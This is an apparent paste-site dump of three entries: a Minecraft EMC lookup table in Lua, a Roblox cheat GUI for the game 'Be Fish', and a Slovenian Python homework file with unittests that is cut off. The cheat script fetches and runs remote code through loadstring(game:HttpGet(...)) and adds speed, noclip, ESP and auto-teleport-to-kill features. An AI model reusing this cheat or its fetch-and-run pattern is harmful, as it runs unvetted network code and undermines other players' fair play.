  ""buildcrafttransport:pipe_lapis_item|5"": 1944,
  ""buildcrafttransport:pipe_lapis_item|4"": 1944,
  ""extratrees:doors.elder|0"": 16,
  ""ironchest:vanilla_iron_shulker_upgrade|0"": 4096,
  ""minecraft:iron_shovel|0"": 264,
  ""mocreatures:wyvwood_planks|0"": 8,
  ""buildcrafttransport:pipe_lapis_item|16"": 1944,
  ""minecraft:diamond_block|0"": 73728,
  ""minecraft:stone_slab|1"": 2,
  ""minecraft:stone_slab|6"": 2,
  ""minecraft:stone_slab|7"": 512,
  ""minecraft:stone_slab|4"": 32,
  ""minecraft:brick|0"": 16,
  ""projectred-exploration:golden_sickle|0"": 6148,
  ""quark:stained_planks_green_stairs|0"": 6,
  ""minecraft:book|0"": 160,
  ""chisel:glassdyedmagenta|2"": 1,
  ""chisel:glassdyedmagenta|3"": 1,
  ""chisel:glassdyedmagenta|0"": 1,
  ""chisel:glassdyedmagenta|1"": 1,
  ""chisel:glassdyedmagenta|4"": 1,
  ""chisel:glassdyedmagenta|5"": 1,
  ""irontanks:copper_iron_upgrade|0"": 641,
  ""minecraft:quartz_block|2"": 1024,
  ""minecraft:quartz_block|1"": 1024,
  ""minecraft:quartz_block|0"": 1024,
  ""minecraft:bone|0"": 144,
  ""minecraft:diamond_boots|0"": 32768,
  ""minecraft:spruce_door|0"": 16,
  ""quark:glowcelium|0"": 64,
  ""extratrees:fence.gates.iroko|0"": 32,
  ""quark:hardened_clay_tiles|0"": 64,
  ""quark:bark_oak_slab|0"": 16,
  ""minecraft:snowball|0"": 1,
  ""minecraft:red_flower|1"": 16,
  ""minecraft:red_flower|0"": 16,
  ""railcraft:bleachedbone_brick_stairs|0"": 162,
  ""minecraft:red_flower|3"": 16,
  ""minecraft:red_flower|2"": 16,
  ""minecraft:red_flower|5"": 16,
  ""minecraft:red_flower|4"": 16,
  ""minecraft:red_flower|7"": 16,
  ""minecraft:red_flower|6"": 16,
  ""minecraft:red_flower|8"": 16,
  ""quark:soul_sandstone_slab|0"": 98,
  ""cathedral:cathedral_railing_various|1"": 2,
  ""cathedral:cathedral_railing_various|2"": 2,
  ""cathedral:cathedral_railing_various|3"": 40,
  ""cathedral:cathedral_railing_various|4"": 2,
  ""cathedral:cathedral_railing_various|5"": 640,
  ""cathedral:cathedral_railing_various|7"": 2,
  ""cathedral:cathedral_railing_various|9"": 2,
  ""quark:stone_diorite_wall|0"": 16,
  ""mocreatures:cobbled_deep_wyvstone|0"": 1,
  ""quark:fire_stone_brick_slab|0"": 32,
  ""quark:charred_nether_brick_slab|0"": 57,
  ""ic2:blockrubsapling|0"": 32,
  ""extratrees:doors.hazel|0"": 16,
  ""railcraft:infernal|4"": 77,
  ""railcraft:infernal|5"": 53,
  ""railcraft:infernal|2"": 53,
  ""railcraft:infernal|3"": 53,
  ""railcraft:infernal|0"": 53,
  ""railcraft:infernal|1"": 53,
  ""minecraft:netherbrick|0"": 1,
  ""minecraft:enchanting_table|0"": 16800,
  ""ironchest:iron_chest|4"": 4164,
  ""ironchest:iron_chest|5"": 28753,
  ""ironchest:iron_chest|6"": 29257,
  ""ironchest:iron_chest|7"": 72,
  ""ironchest:iron_chest|0"": 2112,
  ""ironchest:iron_chest|1"": 12360,
  ""ironchest:iron_chest|2"": 28745,
  ""ironchest:iron_chest|3"": 1088,
  ""cathedral:cathedral_gargoyle_demon_redsandstone|0"": 265,
  ""forestry:fence.gates.walnut|0"": 32,
  ""quark:soul_sandstone_smooth_slab|0"": 98,
  ""projectred-core:resource_item|202"": 1024,
  ""projectred-core:resource_item|200"": 1024,
  ""projectred-core:resource_item|201"": 1024,
  ""minecraft:filled_map|0"": 1472,
  ""projectred-exploration:peridot_sickle|0"": 3076,
  ""quark:red_nether_brick_slab|0"": 25,
  ""extratrees:fence.gates.alder|0"": 32,
  ""minecraft:bed|15"": 174,
  ""minecraft:bed|14"": 174,
  ""minecraft:bed|13"": 171,
  ""minecraft:bed|12"": 216,
  ""minecraft:bed|11"": 492,
  ""minecraft:bed|10"": 333,
  ""minecraft:bed|9"": 330,
  ""minecraft:bed|8"": 174,
  ""minecraft:bed|7"": 180,
  ""minecraft:bed|6"": 174,
  ""minecraft:bed|5"": 177,
  ""minecraft:bed|4"": 174,
  ""minecraft:bed|3"": 174,
  ""minecraft:bed|2"": 174,
  ""minecraft:bed|1"": 174,
  ""minecraft:bed|0"": 168,
  ""extratrees:fence.gates.cedar|0"": 32,
  ""projectred-core:resource_item|250"": 1160,
  ""projectred-core:resource_item|251"": 768,
  ""extratrees:doors.logwood|0"": 16,
  ""projectred-core:resource_item|252"": 1280,
  ""chisel:laboratory|0"": 33,
  ""galacticraftcore:grating|0"": 96,
  ""quark:red_sandstone_wall|0"": 4,
  ""quark:sandy_bricks_slab|0"": 32,
  ""quark:custom_chest_trap|1"": 198,
  ""quark:custom_chest_trap|0"": 198,
  ""quark:custom_chest_trap|3"": 198,
  ""quark:custom_chest_trap|2"": 198,
  ""quark:custom_chest_trap|4"": 198,
  ""railcraft:bleachedbone|5"": 216,
  ""railcraft:bleachedbone|4"": 240,
  ""railcraft:bleachedbone|3"": 216,
  ""railcraft:bleachedbone|2"": 216,
  ""railcraft:bleachedbone|1"": 216,
  ""projectred-exploration:wooden_sickle|0"": 28,
  ""railcraft:bleachedbone|0"": 216,
  ""chiselsandbits:chisel_gold|0"": 2052,
  ""quark:soul_sandstone_stairs|0"": 147,
  ""quark:stained_clay_tiles_magenta_slab|0"": 32,
  ""minecraft:reeds|0"": 32,
  ""minecraft:leather_chestplate|0"": 512,
  ""galacticraftplanets:carbon_fragments|0"": 8,
  ""forestry:fence.gates.poplar|0"": 32,
  ""quark:prismarine_rough_wall|0"": 1024,
  ""quark:gravisand|0"": 129,
  ""projectred-core:resource_item|105"": 128,
  ""extratrees:fence.gates.apple|0"": 32,
  ""projectred-core:resource_item|102"": 512,
  ""projectred-core:resource_item|100"": 128,
  ""projectred-core:resource_item|101"": 256,
  ""minecraft:piston|0"": 348,
  ""quark:stone_limestone_bricks_wall|0"": 1,
  ""quark:stone_granite_stairs|0"": 12,
  ""minecraft:netherrack|0"": 1,
  ""quark:stone_andesite_bricks_wall|0"": 16,
  ""quark:stained_planks_white_slab|0"": 4,
  ""buildcraftfactory:tank|0"": 8,
  ""projectred-exploration:golden_saw|0"": 4108,
  ""ironchest:wood_copper_chest_upgrade|0"": 1032,
  ""extratrees:leaves.decorative.1|1"": 1,
  ""extratrees:leaves.decorative.2|0"": 1,
  ""extratrees:leaves.decorative.3|3"": 1,
  ""extratrees:leaves.decorative.4|2"": 1,
  ""extratrees:leaves.decorative.5|5"": 1,
  ""extratrees:leaves.decorative.1|0"": 1,
  ""extratrees:leaves.decorative.2|1"": 1,
  ""extratrees:leaves.decorative.3|2"": 1,
  ""extratrees:leaves.decorative.4|3"": 1,
  ""extratrees:leaves.decorative.5|4"": 1,
  ""extratrees:leaves.decorative.1|3"": 1,
  ""extratrees:leaves.decorative.2|2"": 1,
  ""extratrees:leaves.decorative.3|1"": 1,
  ""extratrees:leaves.decorative.4|0"": 1,
  ""extratrees:leaves.decorative.5|7"": 1,
  ""mocreatures:deep_wyvstone_pressure_plate|0"": 3,
  ""extratrees:leaves.decorative.1|2"": 1,
  ""extratrees:leaves.decorative.2|3"": 1,
  ""extratrees:leaves.decorative.3|0"": 1,
  ""extratrees:leaves.decorative.4|1"": 1,
  ""extratrees:leaves.decorative.5|6"": 1,
  ""thaumcraft:nugget|9"": 28,
  ""extratrees:leaves.decorative.1|5"": 1,
  ""extratrees:leaves.decorative.2|4"": 1,
  ""extratrees:leaves.decorative.3|7"": 1,
  ""extratrees:leaves.decorative.4|6"": 1,
  ""extratrees:leaves.decorative.5|1"": 1,
  ""extratrees:leaves.decorative.6|0"": 1,
  ""extratrees:leaves.decorative.1|4"": 1,
  ""extratrees:leaves.decorative.2|5"": 1,
  ""extratrees:leaves.decorative.3|6"": 1,
  ""extratrees:leaves.decorative.4|7"": 1,
  ""extratrees:leaves.decorative.5|0"": 1,
  ""extratrees:doors.box|0"": 16,
  ""extratrees:leaves.decorative.1|7"": 1,
  ""extratrees:leaves.decorative.2|6"": 1,
  ""extratrees:leaves.decorative.3|5"": 1,
  ""extratrees:leaves.decorative.4|4"": 1,
  ""extratrees:leaves.decorative.5|3"": 1,
  ""extratrees:leaves.decorative.1|6"": 1,
  ""extratrees:leaves.decorative.2|7"": 1,
  ""extratrees:leaves.decorative.3|4"": 1,
  ""extratrees:leaves.decorative.4|5"": 1,
  ""extratrees:leaves.decorative.5|2"": 1,
  ""extratrees:leaves.decorative.5|13"": 1,
  ""extratrees:leaves.decorative.1|9"": 1,
  ""extratrees:leaves.decorative.2|8"": 1,
  ""extratrees:leaves.decorative.3|11"": 1,
  ""extratrees:leaves.decorative.4|10"": 1,
  ""extratrees:leaves.decorative.1|8"": 1,
  ""extratrees:leaves.decorative.2|9"": 1,
  ""extratrees:leaves.decorative.3|10"": 1,
  ""extratrees:leaves.decorative.4|11"": 1,
  ""extratrees:leaves.decorative.5|12"": 1,
  ""quark:spruce_trapdoor|0"": 8,
  ""extratrees:leaves.decorative.2|10"": 1,
  ""extratrees:leaves.decorative.1|11"": 1,
  ""extratrees:leaves.decorative.3|9"": 1,
  ""extratrees:leaves.decorative.4|8"": 1,
  ""extratrees:leaves.decorative.5|15"": 1,
  ""extratrees:leaves.decorative.1|10"": 1,
  ""extratrees:leaves.decorative.2|11"": 1,
  ""extratrees:leaves.decorative.3|8"": 1,
  ""extratrees:leaves.decorative.4|9"": 1,
  ""extratrees:leaves.decorative.5|14"": 1,
  ""extratrees:leaves.decorative.1|13"": 1,
  ""extratrees:leaves.decorative.2|12"": 1,
  ""extratrees:leaves.decorative.3|15"": 1,
  ""extratrees:leaves.decorative.4|14"": 1,
  ""extratrees:leaves.decorative.5|9"": 1,
  ""extratrees:leaves.decorative.1|12"": 1,
  ""extratrees:leaves.decorative.2|13"": 1,
  ""extratrees:leaves.decorative.3|14"": 1,
  ""extratrees:leaves.decorative.4|15"": 1,
  ""extratrees:leaves.decorative.5|8"": 1,
  ""extratrees:leaves.decorative.1|15"": 1,
  ""extratrees:leaves.decorative.2|14"": 1,
  ""extratrees:leaves.decorative.3|13"": 1,
  ""extratrees:leaves.decorative.4|12"": 1,
  ""extratrees:leaves.decorative.5|11"": 1,
  ""extratrees:leaves.decorative.1|14"": 1,
  ""extratrees:leaves.decorative.2|15"": 1,
  ""extratrees:leaves.decorative.3|12"": 1,
  ""extratrees:leaves.decorative.4|13"": 1,
  ""extratrees:leaves.decorative.5|10"": 1,
  ""extratrees:leaves.decorative.0|14"": 1,
  ""minecraft:brewing_stand|0"": 1539,
  ""extratrees:leaves.decorative.0|15"": 1,
  ""extratrees:leaves.decorative.0|12"": 1,
  ""extratrees:leaves.decorative.0|13"": 1,
  ""extratrees:leaves.decorative.0|10"": 1,
  ""quark:red_sandstone_smooth_slab|0"": 2,
  ""extratrees:leaves.decorative.0|11"": 1,
  ""forestry:resource_storage|0"": 288,
  ""extratrees:leaves.decorative.0|8"": 1,
  ""extratrees:leaves.decorative.0|9"": 1,
  ""extratrees:leaves.decorative.0|6"": 1,
  ""blockcraftery:editable_trap_door_reinforced|0"": 66,
  ""extratrees:leaves.decorative.0|7"": 1,
  ""ic2:itemharz|0"": 64,
  ""mocreatures:wyvwood_button|0"": 16,
  ""extratrees:leaves.decorative.0|4"": 1,
  ""extratrees:leaves.decorative.0|5"": 1,
  ""extratrees:leaves.decorative.0|2"": 1,
  ""extratrees:leaves.decorative.0|3"": 1,
  ""extratrees:leaves.decorative.0|0"": 1,
  ""extratrees:leaves.decorative.0|1"": 1,
  ""chisel:bookshelf_acacia|0"": 504,
  ""extratrees:doors.banana|0"": 16,
  ""thaumcraft:flesh_block|0"": 288,
  ""mocreatures:wyvwood_log|0"": 32,
  ""minecraft:vine|0"": 8,
  ""minecraft:wooden_shovel|0"": 16,
  ""chisel:glass|15"": 1,
  ""chisel:glass|14"": 1,
  ""chisel:glass|13"": 1,
  ""chisel:glass|12"": 1,
  ""chisel:glass|11"": 1,
  ""chisel:glass|10"": 1,
  ""chisel:glass|9"": 1,
  ""chisel:glass|8"": 1,
  ""forestry:stairs.baobab|0"": 6,
  ""chisel:glass|7"": 1,
  ""chisel:glass|6"": 1,
  ""chisel:glass|5"": 1,
  ""chisel:glass|4"": 1,
  ""chisel:glass|3"": 1,
  ""chisel:glass|2"": 1,
  ""chisel:glass|1"": 1,
  ""chisel:glass|0"": 1,
  ""projecte:item.pe_klein_star|0"": 24576,
  ""projecte:item.pe_klein_star|1"": 98304,
  ""projecte:item.pe_klein_star|2"": 393216,
  ""projecte:item.pe_klein_star|3"": 1572864,
  ""projecte:item.pe_klein_star|4"": 6291456,
  ""projecte:item.pe_klein_star|5"": 25165824,
  ""cathedral:basalt_block_checkered|0"": 2,
  ""chisel:cobblestone1|5"": 1,
  ""chisel:cobblestone2|6"": 1,
  ""quark:stained_clay_tiles_cyan_stairs|0"": 48,
  ""chisel:cobblestone1|4"": 1,
  ""chisel:cobblestone2|7"": 1,
  ""chisel:cobblestone1|7"": 1,
  ""chisel:cobblestone2|4"": 1,
  ""chisel:cobblestone1|6"": 1,
  ""chisel:cobblestone2|5"": 1,
  ""chisel:cobblestone1|1"": 1,
  ""chisel:cobblestone2|2"": 1,
  ""quark:colored_flowerpot_pink|0"": 64,
  ""chisel:cobblestone1|0"": 1,
  ""chisel:cobblestone2|3"": 1,
  ""chisel:cobblestone1|3"": 1,
  ""chisel:cobblestone2|0"": 1,
  ""chisel:cobblestone1|2"": 1,
  ""chisel:cobblestone2|1"": 1,
  ""chisel:cobblestone1|9"": 1,
  ""irontanks:diamond_tank|0"": 22300,
  ""chisel:cobblestone1|8"": 1,
  ""chisel:cobblestone2|8"": 1,
  ""chisel:cobblestone2|9"": 1,
  ""quark:snow_bricks|0"": 1,
  ""quark:stained_planks|7"": 8,
  ""quark:stained_planks|6"": 8,
  ""quark:stained_planks|5"": 8,
  ""quark:stained_planks|4"": 8,
  ""quark:stained_planks|3"": 8,
  ""quark:stained_planks|2"": 8,
  ""forestry:doors.larch|0"": 16,
  ""quark:stained_planks|1"": 8,
  ""quark:stained_planks|0"": 8,
  ""quark:stained_planks|15"": 8,
  ""quark:stained_planks|14"": 8,
  ""quark:stained_planks|13"": 8,
  ""quark:stained_planks|12"": 8,
  ""quark:stained_planks|11"": 8,
  ""quark:stained_planks|10"": 8,
  ""mocreatures:wyvwood_stairs|0"": 6,
  ""quark:stained_planks|9"": 8,
  ""quark:stained_planks|8"": 8,
  ""blockcraftery:editable_slant|0"": 4,
  ""extratrees:fence.gates.maclura|0"": 32,
  ""extratrees:stairs.hornbeam|0"": 6,
  ""forestry:doors.balsa|0"": 16,
  ""chisel:planks-spruce|11"": 8,
  ""chisel:planks-spruce|10"": 8,
  ""chisel:planks-spruce|9"": 8,
  ""chisel:planks-spruce|8"": 8,
  ""chisel:planks-spruce|14"": 8,
  ""chisel:planks-spruce|13"": 8,
  ""chisel:planks-spruce|12"": 8,
  ""irontanks:gold_diamond_upgrade|0"": 18433,
  ""chisel:planks-spruce|3"": 8,
  ""chisel:planks-spruce|2"": 8,
  ""chisel:planks-spruce|1"": 8,
  ""chisel:planks-spruce|0"": 8,
  ""chisel:planks-spruce|7"": 8,
  ""chisel:planks-spruce|6"": 8,
  ""minecraft:stone_pickaxe|0"": 11,
  ""chisel:planks-spruce|5"": 8,
  ""chisel:planks-spruce|4"": 8,
  ""minecraft:red_mushroom|0"": 32,
  ""ironchest:copper_iron_shulker_upgrade|0"": 1156,
  ""minecraft:repeater|0"": 203,
  ""extratrees:fence.gates.elm|0"": 32,
  ""extratrees:stairs.eucalyptus|0"": 6,
  ""minecraft:redstone|0"": 64,
  ""minecraft:magma|0"": 128,
  ""quark:stained_planks_yellow_slab|0"": 4,
  ""projectred-exploration:peridot_hoe|0"": 2056,
  ""quark:red_nether_brick_stairs|0"": 37,
  ""minecraft:record_13|0"": 2048,
  ""minecraft:record_11|0"": 2048,
  ""minecraft:nether_brick_stairs|0"": 3,
  ""minecraft:trapdoor|0"": 8,
  ""minecraft:purpur_pillar|0"": 192,
  ""minecraft:dark_oak_fence|0"": 13,
  ""projecte:transmutation_table|0"": 260,
  ""cathedral:cathedral_gargoyle_demon_limestone|0"": 253,
  ""blockcraftery:editable_outer_corner|0"": 2,
  ""forestry:doors.papaya|0"": 16,
  ""minecraft:milk_bucket|0"": 784,
  ""quark:arrow_explosive|0"": 398,
  ""galacticraftcore:canister|1"": 448,
  ""galacticraftcore:canister|0"": 896,
  ""quark:elder_prismarine_wall|0"": 128,
  ""chisel:lavastone|0"": 9,
  ""quark:prismarine_slab|0"": 512,
  ""quark:gold_button|0"": 2056,
  ""minecraft:rabbit_foot|0"": 128,
  ""forestry:stairs.mahogany|0"": 6,
  ""projectred-exploration:iron_sickle|0"": 772,
  ""minecraft:gold_nugget|0"": 227,
  ""minecraft:double_plant|4"": 32,
  ""minecraft:double_plant|5"": 32,
  ""minecraft:double_plant|0"": 32,
  ""minecraft:double_plant|1"": 32,
  ""minecraft:double_plant|2"": 1,
  ""minecraft:double_plant|3"": 1,
  ""railcraft:abyssal|5"": 32,
  ""railcraft:abyssal|4"": 56,
  ""railcraft:abyssal|3"": 32,
  ""railcraft:abyssal|2"": 32,
  ""railcraft:abyssal|1"": 32,
  ""quark:stonebrick_mossy_slab|0"": 4,
  ""railcraft:abyssal|0"": 32,
  ""projecte:item.pe_fuel|2"": 8192,
  ""projecte:item.pe_fuel|0"": 512,
  ""projecte:item.pe_fuel|1"": 2048,
  ""quark:colored_flowerpot_yellow|0"": 64,
  ""minecraft:flint|0"": 4,
  ""minecraft:lead|0"": 40,
  ""minecraft:bow|0"": 48,
  ""forestry:fence.gates.lime|0"": 32,
  ""minecraft:fishing_rod|0"": 36,
  ""quark:world_stone_carved|5"": 1,
  ""forestry:fence.gates.cocobolo|0"": 32,
  ""quark:world_stone_carved|2"": 16,
  ""quark:world_stone_carved|1"": 16,
  ""minecraft:spruce_fence_gate|0"": 32,
  ""quark:world_stone_carved|0"": 16,
  ""minecraft:tallgrass|0"": 1,
  ""minecraft:tallgrass|1"": 1,
  ""minecraft:tallgrass|2"": 1,
  ""quark:stained_clay_tiles_magenta_stairs|0"": 48,
  ""minecraft:nether_wart|0"": 24,
  ""mocreatures:mossy_cobbled_wyvstone_slab|0"": 1,
  ""minecraft:sign|0"": 17,
  ""quark:elder_sea_lantern|0"": 3712,
  ""chisel:voidstone|0"": 37,
  ""minecraft:purpur_block|0"": 192,
  ""galacticraftcore:fluid_tank|0"": 2,
  ""blockcraftery:editable_stairs|0"": 6,
  ""quark:elder_prismarine_dark_stairs|0"": 780,
  ""quark:glowshroom|0"": 64,
  ""fairylights:garland|0"": 260,
  ""projectred-exploration:sapphire_saw|0"": 2060,
  ""minecraft:coal_block|0"": 1152,
  ""chisel:glassdyedyellow|4"": 1,
  ""chisel:glassdyedyellow|5"": 1,
  ""chisel:glassdyedyellow|0"": 1,
  ""chisel:glassdyedyellow|1"": 1,
  ""minecraft:packed_ice|0"": 4,
  ""chisel:glassdyedyellow|2"": 1,
  ""chisel:glassdyedyellow|3"": 1,
  ""quark:stained_planks_gray_slab|0"": 4,
  ""minecraft:water_bucket|0"": 768,
  ""minecraft:iron_bars|0"": 96,
  ""minecraft:mycelium|0"": 2,
  ""minecraft:poisonous_potato|0"": 64,
  ""extratrees:fence.gates.purpleheart|0"": 32
}
]]

local emcLookup = {}

local lookuptable = textutils.unserializeJSON(lookuptableJson)

function emcLookup.itemDetail (getItemDetailOutput)
    if getItemDetailOutput then
        local itemName = getItemDetailOutput[""name""]
        local itemData = getItemDetailOutput[""damage""]
        local itemCount = getItemDetailOutput[""count""]
        
        return emcLookup.emc(itemName, itemData)
    end
end

function emcLookup.stackDetail (getItemDetailOutput)
    if getItemDetailOutput then
        local itemName = getItemDetailOutput[""name""]
        local itemData = getItemDetailOutput[""damage""]
        local itemCount = getItemDetailOutput[""count""]
        
        return emcLookup.emc(itemName, itemData) * itemCount 
    end
end

function emcLookup.emc (name, data)
    data = data or 0
    return lookuptable[name..""|""..data]
end

return emcLookup"
zUfSPSYM,BeFish,ANPstore,Lua,Tuesday 22nd of July 2025 11:17:41 AM CDT,"getgenv().SecureMode = true
local Rayfield = loadstring(game:HttpGet(""https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua""))()

local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService(""RunService"")
local TeleportService = game:GetService(""TeleportService"")
local HttpService = game:GetService(""HttpService"")
local Workspace = game:GetService(""Workspace"")

-- Variables
local speedBoost = 55
local tracerEnabled = false
local espEnabled = false
local antiLag = false
local noClip = false
local autoKill = false
local Configs = {}

-- UI
local Window = Rayfield:CreateWindow({
   Name = ""[🐠] Be Fish GUI"",
   LoadingTitle = ""Be Fish Tools by TakayamaZhou"",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = ""TakayamaStore"",
      FileName = ""BeFish""
   }
})

local TabFish = Window:CreateTab(""Fish"", 4483362458)
local TabMisc = Window:CreateTab(""Misc"", 4483362458)
local TabConfig = Window:CreateTab(""Config"", 4483362458)
local TabServer = Window:CreateTab(""Server"", 4483362458)
local TabInfo = Window:CreateTab(""Info"", 4483362458)

-- Speed Control
TabFish:CreateSlider({
   Name = ""Speed Boost"",
   Range = {0, 200},
   Increment = 5,
   CurrentValue = 55,
   Callback = function(v) speedBoost = v end,
})

TabFish:CreateToggle({
   Name = ""Tracer ESP"",
   CurrentValue = false,
   Callback = function(val) tracerEnabled = val end
})

TabFish:CreateToggle({
   Name = ""ESP Nametag"",
   CurrentValue = false,
   Callback = function(val) espEnabled = val end
})

-- Misc Features
TabMisc:CreateToggle({
   Name = ""Anti Lag"",
   CurrentValue = false,
   Callback = function(val) antiLag = val end
})

TabMisc:CreateToggle({
   Name = ""No Clip"",
   CurrentValue = false,
   Callback = function(val) noClip = val end
})

TabMisc:CreateToggle({
   Name = ""Auto Kill/TP ikan lemah"",
   CurrentValue = false,
   Callback = function(val) autoKill = val end
})

-- Config System
TabConfig:CreateInput({
   Name = ""Nama Config"",
   PlaceholderText = ""Contoh: Config1"",
   RemoveTextAfterFocusLost = false,
   Callback = function(input) Configs.current = input end
})

TabConfig:CreateButton({
   Name = ""Save Config"",
   Callback = function()
      Rayfield:SaveConfiguration()
   end
})

TabConfig:CreateButton({
   Name = ""Load Config"",
   Callback = function()
      Rayfield:LoadConfiguration()
   end
})

TabConfig:CreateButton({
   Name = ""Delete Config"",
   Callback = function()
      Rayfield:DeleteConfiguration()
   end
})

-- Server
TabServer:CreateButton({
   Name = ""Rejoin Game"",
   Callback = function()
      TeleportService:Teleport(game.PlaceId, LocalPlayer)
   end
})

TabServer:CreateButton({
   Name = ""Respawn"",
   Callback = function()
      LocalPlayer.Character:BreakJoints()
   end
})

TabServer:CreateButton({
   Name = ""Change Server"",
   Callback = function()
      TeleportService:TeleportToPlaceInstance(game.PlaceId, HttpService:GenerateGUID(false), LocalPlayer)
   end
})

-- Info
TabInfo:CreateParagraph({
   Title = ""Script Info"",
   Content = ""Script by @TakayamaZhou\nSpeed Boost Default: 55\nMax Boost: 200\nJoin Community for updates!""
})

-- Main Loop
RunService.Stepped:Connect(function()
   local char = LocalPlayer.Character
   if char and char:FindFirstChild(""Humanoid"") then
      char.Humanoid.WalkSpeed = speedBoost

      if noClip then
         for _,v in pairs(char:GetDescendants()) do
            if v:IsA(""BasePart"") then v.CanCollide = false end
         end
      end

      if tracerEnabled then
         for _,v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild(""HumanoidRootPart"") then
               local a0 = Instance.new(""Attachment"", char.HumanoidRootPart)
               local a1 = Instance.new(""Attachment"", v.Character.HumanoidRootPart)
               local beam = Instance.new(""Beam"", a0)
               beam.Attachment0 = a0
               beam.Attachment1 = a1
               beam.Width0 = 0.1
               beam.Color = ColorSequence.new(Color3.new(1,0,0))
            end
         end
         tracerEnabled = false
      end

      if espEnabled then
         for _,v in pairs(Players:GetPlayers()) do
            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild(""Head"") then
               local gui = Instance.new(""BillboardGui"", v.Character.Head)
               gui.Size = UDim2.new(0, 100, 0, 40)
               gui.AlwaysOnTop = true
               local label = Instance.new(""TextLabel"", gui)
               label.Size = UDim2.new(1, 0, 1, 0)
               label.Text = v.Name
               label.BackgroundTransparency = 1
               label.TextColor3 = Color3.new(1,1,1)
            end
         end
         espEnabled = false
      end

      if antiLag then
         for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA(""ParticleEmitter"") or obj:IsA(""Trail"") or obj:IsA(""Decal"") or obj:IsA(""Sound"") then
               pcall(function() obj:Destroy() end)
            end
         end
      end

      if autoKill then
         for _,v in pairs(Workspace:GetChildren()) do
            if v:IsA(""Model"") and v:FindFirstChild(""Humanoid"") and v:FindFirstChild(""HumanoidRootPart"") then
               local tag = v:FindFirstChildOfClass(""StringValue"") or v:FindFirstChildWhichIsA(""StringValue"")
               if tag and tonumber(tag.Value) and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                  local ownPower = tonumber(tag.Parent:FindFirstChildOfClass(""StringValue"") and tag.Parent:FindFirstChildOfClass(""StringValue"").Value or 99999)
                  if ownPower > tonumber(tag.Value) then
                     LocalPlayer.Character:MoveTo(v.HumanoidRootPart.Position)
                  end
               end
            end
         end
      end
   end
end)
"
yvzGrE1N,Untitled,Josif_tepe,Python,Tuesday 22nd of July 2025 11:03:42 AM CDT,"import unittest
import os
import warnings

class NoWarning(unittest.TestCase):
    def setUp(self):
        warnings.simplefilter(""ignore"", ResourceWarning)

def unikati(s):
    visited = {}
    res = []

    for name in s:
        if name not in visited:
            res.append(name)
            visited[name] = True

    return res

def skupnih(s, t):
    set_s = set()
    set_t = set()

    for name in s:
        set_s.add(name)

    for name in t:
        set_t.add(name)

    cnt = 0
    for name in set_s:
        if name in set_t:
            cnt += 1

    return cnt

def vseh(s, t):
    unique_elements = set()

    for name in s:
        unique_elements.add(name)

    for name in t:
        unique_elements.add(name)

    return len(unique_elements)

def preberi_datoteko(ime_dat, locilo):
    res_arr = []
    with open(ime_dat, ""r"") as f:
        for line in f:
            tmp_arr = line.split(locilo)
            res_arr.append(tmp_arr)

    return res_arr

def filtriran(s, stolpec, vrednost):
    res_arr = []
    for arr in s:
        if len(arr) > stolpec:
            if type(vrednost) == type(arr[stolpec]) and vrednost == arr[stolpec]:
                res_arr.append(arr)

    return res_arr
def izlusci(s, stolpec):
    res_arr = []
    for arr in s:
        if len(arr) > stolpec:
            res_arr.append(arr[stolpec])

    return res_arr

def predmeti(ime_dat, osebe):
    visited = set()
    arr = []
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if osebe == a[1]:
                if a[0] not in visited:
                    visited.add(a[0])
                    arr.append(a[0])

    return arr
def osebe(ime_dat, predmet):
    arr = []
    visited = set()
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[0] == predmet:
                if a[1] not in visited:
                    visited.add(a[1])
                    arr.append(a[1])

    return list(arr)

def podobnost_oseb(ime_dat, oseba1, oseba2):
    predmeti_1 = set()
    predmeti_2 = set()
    predmeti = set()
    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[1] == oseba1:
                predmeti_1.add(a[0])
                predmeti.add(a[0])


            if a[1] == oseba2:
                predmeti_2.add(a[0])
                predmeti.add(a[0])

    zaednicki = 0
    for predmet in predmeti_1:
        if predmet in predmeti_2:
            zaednicki += 1

    return zaednicki / float(len(predmeti))
def podobnost_predmetov(ime_dat, predmet1, predmet2):
    p1 = set()
    p2 = set()
    p = set()

    with open(ime_dat, ""r"") as f:
        for line in f:
            a = line.split("","")
            if a[0] == predmet1:
                p1.add(a[1])
                p.add(a[1])

            if a[0] == predmet2:
                p2.add(a[1])
                p.add(a[1])

    zaednicki = 0
    for lice in p1:
        if lice in p2:
            zaednicki += 1

    return zaednicki / float(len(p))

class TestSeznami(NoWarning):
    def test_01_unikati(self):
        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        t = s.copy()
        self.assertEqual([""Ana"", ""Berta"", ""Cilka"", ""Ema"", ""Dani""], unikati(s))
        self.assertEqual(t, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual([], unikati([]))
        self.assertEqual([""Ana""], unikati([""Ana""]))
        self.assertEqual([5, 8, 3], unikati([5, 8, 3]))
        self.assertEqual([5, 8, 3], unikati([5, 5, 5, 5, 8, 5, 8, 8, 8, 3, 3, 3, 5]))

    def test_02_skupnih(self):
        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        sc = s.copy()
        t = [""Cilka"", ""Fanči"", ""Ana"", ""Ana"", ""Fanči"", ""Ana"", ""Cilka""]
        tc = t.copy()
        self.assertEqual(2, skupnih(s, t))
        self.assertEqual(2, skupnih(t, s))
        self.assertEqual(sc, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(tc, t, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(0, skupnih(s, [""Fanči"", ""Greta""]))
        self.assertEqual(1, skupnih(t, [""Fanči"", ""Greta""]))
        self.assertEqual(0, skupnih(s, []))
        self.assertEqual(0, skupnih([], []))

    def test_03_vseh(self):
